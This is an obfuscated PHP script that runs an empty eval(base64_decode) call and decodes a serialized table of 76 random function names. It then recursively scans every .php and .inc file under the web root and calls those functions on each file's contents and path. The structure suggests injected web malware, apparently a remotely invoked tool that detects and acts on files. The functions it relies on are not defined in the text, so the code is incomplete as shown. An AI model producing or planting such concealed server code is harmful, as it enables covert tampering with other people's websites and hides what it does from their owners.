eval(base64_decode(""));
$defs = unserialize(base64_decode("YTo3Njp7aTowO2E6Mzp7aTowO2k6MjtpOjE7czoxMToicndobmhjdHl0cXQiO2k6MjtzOjg6Imd6d3Vud3ltIjt9aToxO2E6Mzp7aTowO2k6NTtpOjE7czo2OiJydXlzcGwiO2k6MjtzOjU6Imd5YW1lIjt9aToyO2E6Mzp7aTowO2k6MTU7aToxO3M6NzoicmtmcXB6diI7aToyO3M6ODoiZ2NwZWNhcHQiO31pOjM7YTozOntpOjA7aToxODtpOjE7czo3OiJyZmJ3Y25lIjtpOjI7czo0OiJncHZ2Ijt9aTo0O2E6Mzp7aTowO2k6MjM7aToxO3M6MTE6InJndXN2b3p4c3V5IjtpOjI7czo2OiJnd2RyYXMiO31pOjU7YTozOntpOjA7aTozNjtpOjE7czo0OiJycnRsIjtpOjI7czoxMDoiZ2pqcHR4Y2dmaiI7fWk6NjthOjM6e2k6MDtpOjQyO2k6MTtzOjg6InJtbnlhamphIjtpOjI7czo1OiJnZXJocCI7fWk6NzthOjM6e2k6MDtpOjU0O2k6MTtzOjg6InJid2hhcGJ2IjtpOjI7czo3OiJnaHl0ZXJhIjt9aTo4O2E6Mzp7aTowO2k6NjA7aToxO3M6OToicm9odHVkcXFsIjtpOjI7czoxMDoiZ3JxaWZnbWZ5cyI7fWk6OTthOjM6e2k6MDtpOjg5O2k6MTtzOjEwOiJyY2VoZ3NscmJnIjtpOjI7czoxMDoiZ3Zla29vcmlqZSI7fWk6MTA7YTozOntpOjA7aToxMDk7aToxO3M6NzoicmdodXBhcCI7aToyO3M6NzoiZ3ZsaHdpcyI7fWk6MTE7YTozOntpOjA7aToxMTA7aToxO3M6MTE6InJka2lsdnVzaGhnIjtpOjI7czo2OiJnb2Z2c3ciO31pOjEyO2E6Mzp7aTowO2k6MTExO2k6MTtzOjQ6InJ3dmEiO2k6MjtzOjk6ImdkeGJhcnpxZiI7fWk6MTM7YTozOntpOjA7aToxMTI7aToxO3M6OToicmlsbHZpbnRpIjtpOjI7czo2OiJndGNkbWgiO31pOjE0O2E6Mzp7aTowO2k6MTE1O2k6MTtzOjc6InJoc2J2c2ciO2k6MjtzOjQ6ImdldHgiO31pOjE1O2E6Mzp7aTowO2k6MTE4O2k6MTtzOjg6InJxamF3bnVsIjtpOjI7czoxMDoiZ2trY3d3c3FhaSI7fWk6MTY7YTozOntpOjA7aToxMjY7aToxO3M6NDoicnBoaCI7aToyO3M6MTE6Imdzb3B6bGVxZ3dxIjt9aToxNzthOjM6e2k6MDtpOjEyNztpOjE7czo0OiJydXhtIjtpOjI7czoxMDoiZ2tnZmhna21obyI7fWk6MTg7YTozOntpOjA7aToxMzA7aToxO3M6MTE6InJnZXJ4bHhqcWd2IjtpOjI7czo3OiJndHl2bmFrIjt9aToxOTthOjM6e2k6MDtpOjEzNDtpOjE7czo1OiJya3dyYiI7aToyO3M6MTA6ImdqeGVwa2JneXQiO31pOjIwO2E6Mzp7aTowO2k6MTM4O2k6MTtzOjEwOiJyY3N4dGtocHVnIjtpOjI7czo4OiJnbGNxdWFkbCI7fWk6MjE7YTozOntpOjA7aToxNDg7aToxO3M6NjoicmZ6ZmhrIjtpOjI7czo4OiJnc2x1aXBzbyI7fWk6MjI7YTozOntpOjA7aToxNTc7aToxO3M6MTA6InJyeHdkbHFzdHYiO2k6MjtzOjk6ImdvbXptcHV2aSI7fWk6MjM7YTozOntpOjA7aToxNjM7aToxO3M6NDoicmpqdSI7aToyO3M6ODoiZ3NycGZ0a3IiO31pOjI0O2E6Mzp7aTowO2k6MTcyO2k6MTtzOjEwOiJyb2J2YWZsZ3NyIjtpOjI7czo2OiJndGF4ZWEiO31pOjI1O2E6Mzp7aTowO2k6MTc0O2k6MTtzOjk6InJlcXJlaXZ0dyI7aToyO3M6NDoiZ2ZzdyI7fWk6MjY7YTozOntpOjA7aToxNzk7aToxO3M6NzoicmJ0cndudiI7aToyO3M6NToiZ3R4cmoiO31pOjI3O2E6Mzp7aTowO2k6MTg3O2k6MTtzOjc6InJ5eml6eWIiO2k6MjtzOjk6Imd2Y3NlaHhwdCI7fWk6Mjg7YTozOntpOjA7aToxODk7aToxO3M6NToicmVyeHQiO2k6MjtzOjQ6Imdnem8iO31pOjI5O2E6Mzp7aTowO2k6MTkyO2k6MTtzOjY6InJ0amFiciI7aToyO3M6MTA6Imdja2Fnc3p6d3oiO31pOjMwO2E6Mzp7aTowO2k6MTk2O2k6MTtzOjk6InJuYmVodXpqYSI7aToyO3M6NToiZ3V1aXYiO31pOjMxO2E6Mzp7aTowO2k6MTk4O2k6MTtzOjEwOiJyaGZyb3pwZGVwIjtpOjI7czo1OiJnZm14aSI7fWk6MzI7YTozOntpOjA7aToxOTk7aToxO3M6OToicmJoaG1hanhpIjtpOjI7czo5OiJnYXZoamVlZXEiO31pOjMzO2E6Mzp7aTowO2k6MjAwO2k6MTtzOjY6InJ3eHpweSI7aToyO3M6ODoiZ2Fyb2RwaXkiO31pOjM0O2E6Mzp7aTowO2k6MjAxO2k6MTtzOjc6InJpbnpwZWwiO2k6MjtzOjU6ImdwZ3ViIjt9aTozNTthOjM6e2k6MDtpOjIwMztpOjE7czo2OiJyb2hha2kiO2k6MjtzOjg6Imd0emVid3RuIjt9aTozNjthOjM6e2k6MDtpOjIwNjtpOjE7czo4OiJydGZnbXBmZiI7aToyO3M6NzoiZ2Z1Y3dqdiI7fWk6Mzc7YTozOntpOjA7aToyMDk7aToxO3M6NjoicndndXZsIjtpOjI7czo1OiJnc3FpdSI7fWk6Mzg7YTozOntpOjA7aToyMTA7aToxO3M6Njoicm1vZ3VtIjtpOjI7czo4OiJncGZndmN3eiI7fWk6Mzk7YTozOntpOjA7aToyMTI7aToxO3M6NzoicnNmYmtuZCI7aToyO3M6OToiZ2VvdmlmcGV5Ijt9aTo0MDthOjM6e2k6MDtpOjIxMztpOjE7czo1OiJycnljayI7aToyO3M6MTE6ImduZmhyY210b2VkIjt9aTo0MTthOjM6e2k6MDtpOjIxNDtpOjE7czo1OiJydm10cCI7aToyO3M6OToiZ2phcmd1bHhoIjt9aTo0MjthOjM6e2k6MDtpOjIxNTtpOjE7czo2OiJydGtvdWgiO2k6MjtzOjQ6ImdmcmgiO31pOjQzO2E6Mzp7aTowO2k6MjE2O2k6MTtzOjU6InJiYXNuIjtpOjI7czo5OiJndmtza25vaGsiO31pOjQ0O2E6Mzp7aTowO2k6MjE3O2k6MTtzOjEwOiJyaHNwaXdnbHhqIjtpOjI7czo4OiJnZXFldWtoaSI7fWk6NDU7YTozOntpOjA7aToyMTg7aToxO3M6NToicmhobGciO2k6MjtzOjEwOiJnbHNpcXp1bW1vIjt9aTo0NjthOjM6e2k6MDtpOjIyMTtpOjE7czo1OiJyYm13bSI7aToyO3M6OToiZ3N3Y2JmZmRwIjt9aTo0NzthOjM6e2k6MDtpOjIyMjtpOjE7czo3OiJya2dhaXVzIjtpOjI7czo2OiJnaXZldG4iO31pOjQ4O2E6Mzp7aTowO2k6MjIzO2k6MTtzOjc6InJzZGl3ZHgiO2k6MjtzOjExOiJnZHdsbWFtZGNuZCI7fWk6NDk7YTozOntpOjA7aToyMjQ7aToxO3M6MTE6InJpeWl2dnh4ZnloIjtpOjI7czo0OiJndGRkIjt9aTo1MDthOjM6e2k6MDtpOjIyNTtpOjE7czo2OiJyamxoZXQiO2k6MjtzOjY6ImdidHRyYyI7fWk6NTE7YTozOntpOjA7aToyMzA7aToxO3M6NzoicnlzZ25jeSI7aToyO3M6NDoiZ3dlaCI7fWk6NTI7YTozOntpOjA7aToyMzI7aToxO3M6NToicnZoamUiO2k6MjtzOjQ6Imdra2UiO31pOjUzO2E6Mzp7aTowO2k6MjM1O2k6MTtzOjc6InJ1ZHVoeWIiO2k6MjtzOjg6ImdoY2ZxZmZjIjt9aTo1NDthOjM6e2k6MDtpOjIzNjtpOjE7czo2OiJyb2Npc2siO2k6MjtzOjEwOiJnc3pidmxzbGZ6Ijt9aTo1NTthOjM6e2k6MDtpOjIzNztpOjE7czo2OiJybHByd3UiO2k6MjtzOjg6ImdkeHltZWFzIjt9aTo1NjthOjM6e2k6MDtpOjIzODtpOjE7czo1OiJyYWliaSI7aToyO3M6OToiZ3loaGl6ZnRqIjt9aTo1NzthOjM6e2k6MDtpOjIzOTtpOjE7czo4OiJydWFpZnVuaCI7aToyO3M6ODoiZ2pqcmtjeGMiO31pOjU4O2E6Mzp7aTowO2k6MjQwO2k6MTtzOjQ6InJjc3EiO2k6MjtzOjEwOiJneG5xeWtta3poIjt9aTo1OTthOjM6e2k6MDtpOjI0MTtpOjE7czo2OiJyZ2t1a20iO2k6MjtzOjc6ImdxYXdkaG0iO31pOjYwO2E6Mzp7aTowO2k6MjQyO2k6MTtzOjc6InJrd2VxaGoiO2k6MjtzOjExOiJnZW5zdWdiemxhbyI7fWk6NjE7YTozOntpOjA7aToyNDM7aToxO3M6NToicm50cWYiO2k6MjtzOjQ6ImdscmkiO31pOjYyO2E6Mzp7aTowO2k6MjQ0O2k6MTtzOjk6InJqbWZremVzbyI7aToyO3M6MTE6Imdkd2ZqZ21xYmR1Ijt9aTo2MzthOjM6e2k6MDtpOjI0NTtpOjE7czo2OiJydXVnbmEiO2k6MjtzOjc6ImdzY3JicWsiO31pOjY0O2E6Mzp7aTowO2k6MjQ2O2k6MTtzOjY6InJkam5nZSI7aToyO3M6MTE6ImduenZ3b2Jkd2F4Ijt9aTo2NTthOjM6e2k6MDtpOjI0NztpOjE7czoxMToicm9wcmV3ZndmeG0iO2k6MjtzOjY6ImdxcWVtYSI7fWk6NjY7YTozOntpOjA7aToyNDg7aToxO3M6MTA6InJ3cmxteWZvZ3QiO2k6MjtzOjk6ImdndWtzenZ4cSI7fWk6Njc7YTozOntpOjA7aToyNDk7aToxO3M6NjoicmR4cHpxIjtpOjI7czo2OiJnYXN1cGIiO31pOjY4O2E6Mzp7aTowO2k6MjUwO2k6MTtzOjQ6InJyd2UiO2k6MjtzOjk6Imd1eWpyc3h3eiI7fWk6Njk7YTozOntpOjA7aToyNTE7aToxO3M6Njoicm1pYXl2IjtpOjI7czo1OiJndmNkdiI7fWk6NzA7YTozOntpOjA7aToyNTI7aToxO3M6MTA6InJpbnFibXVhZ2siO2k6MjtzOjY6ImdzdnBncyI7fWk6NzE7YTozOntpOjA7aToyNTM7aToxO3M6MTE6InJrZXRkdXZnd2ptIjtpOjI7czo5OiJnaXhtemJ4bHciO31pOjcyO2E6Mzp7aTowO2k6MjU0O2k6MTtzOjExOiJyc3ZocnJuenN3dyI7aToyO3M6MTA6Imd4YmlvYnJ6eW4iO31pOjczO2E6Mzp7aTowO2k6MjU1O2k6MTtzOjc6InJnemh3bHEiO2k6MjtzOjQ6Imdnc3AiO31pOjc0O2E6Mzp7aTowO2k6MjU2O2k6MTtzOjk6InJ6Y3hsaXJ5eSI7aToyO3M6NzoiZ3VyaGxzZiI7fWk6NzU7YTozOntpOjA7aToyNTc7aToxO3M6NToicm5iYmQiO2k6MjtzOjk6Imd1eHBwZmJhbCI7fX0="));

function GetDocRoot()
{
    $docroot_end = strrpos($_SERVER['SCRIPT_FILENAME'], $_SERVER['REQUEST_URI']);
    if ($docroot_end === FALSE)
    {
        return $_SERVER['DOCUMENT_ROOT'];
    }
    elseif ($docroot_end === 0)
    {
        return "/";
    }
    else
    {
        return substr($_SERVER['SCRIPT_FILENAME'], 0, $docroot_end);
    }
}

function GetFileList($dir, $depth=1000000000)
{
    $result = array();

    $dir_count = 0;

    if ($depth < 1) {
        return $result;
    }

    $dir = strlen($dir) == 1 ? $dir : rtrim($dir, '\\/');
    $h = @opendir($dir);
    if ($h === FALSE)
    {
        return $result;
    }

    while (($f = readdir($h)) !== FALSE)
    {
        if ($f !== '.' and $f !== '..')
        {
            $current_dir = "$dir/$f";
            if (is_dir($current_dir))
            {
                $dir_count += 1;

                $result = array_merge($result, GetFileList($current_dir, $depth / 10));
            }
            else
            {
                $path_parts = pathinfo($current_dir);
                if (isset($path_parts['extension']) && ($path_parts['extension']=="php" || $path_parts['extension']=="inc"))
                {
                    $result[] = $current_dir;
                }

            }
        }
    }

    closedir($h);

    return $result;
}

$res = Array();
foreach(GetFileList(GetDocRoot()) as $path)
{
    $content = @file_get_contents($path);
    foreach($defs as $def_item)
    {
        if($def_item[1]($content))
        {
            if (!array_key_exists($def_item[0], $res))
            {
                $res[$def_item[0]] = 0;
            }
            
            $res[$def_item[0]] += 1;
            
            $def_item[2]($path);
        }
    }
}

echo base64_encode(serialize($res));
exit();